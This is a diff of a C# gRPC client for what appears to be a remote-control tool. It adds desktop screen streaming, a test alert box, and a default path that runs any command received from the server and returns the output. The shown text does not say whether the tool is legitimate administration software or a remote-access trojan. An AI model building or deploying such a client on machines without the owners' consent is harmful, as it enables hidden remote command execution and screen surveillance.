@@ -2,14 +2,18 @@
 using Grpc.Net.Client;
 using Grpc.Net.Client.Configuration;
 using Server.Protos;
-using static Server.Protos.Handler;
+using System.Windows;
+using static Server.Protos.CommandStreamer;
 
 namespace Client.Services;
 
 internal class ClientService
 {
     private readonly string ClientName = Environment.UserName;
-    private readonly string ConnectionGuid = Guid.NewGuid().ToString();
+    public static readonly string ConnectionGuid = Guid.NewGuid().ToString();
+
+    private CancellationTokenSource _streamingCts = null!;
+    private Task _streamingTask = null!;
 
     public async Task Run()
     {
@@ -39,7 +43,7 @@ internal class ClientService
         }
     }
 
-    private HandlerClient ConfigureClient()
+    private CommandStreamerClient ConfigureClient()
     {
         var defaultMethodConfig = new MethodConfig
         {
@@ -68,7 +72,7 @@ internal class ClientService
             ServiceConfig = serviceConfig
         });
 
-        return new HandlerClient(channel);
+        return new CommandStreamerClient(channel);
     }
 
     private async Task HandleCommandAsync(string command, IClientStreamWriter<Request> requestStream)
@@ -76,14 +80,29 @@ internal class ClientService
         switch (command)
         {
             case AppConstants.EndCommand:
+                _streamingCts?.Cancel();
                 await requestStream.CompleteAsync();
                 break;
+
+            case AppConstants.EnableStreamCommand:
+                if (_streamingTask == null || _streamingTask.IsCompleted)
+                {
+                    _streamingCts?.Cancel();
+                    _streamingCts = new CancellationTokenSource();
+                    _streamingTask = DesktopStreaming.Run(_streamingCts.Token);
+                }
+                break;
+
+            case AppConstants.AlertCommand:
+                MessageBox.Show("test", string.Empty, MessageBoxButton.OK);
+                break;
+
             default:
+                //if (_streamingTask != null && !_streamingTask.IsCompleted)
                 var executionResult = await CommandService.ExecuteCommand(command);
                 var request = new Request
                 {
                     Id = ConnectionGuid,
-                    //Name = ClientName,
                     Message = executionResult,
                     IsInitial = false
                 };
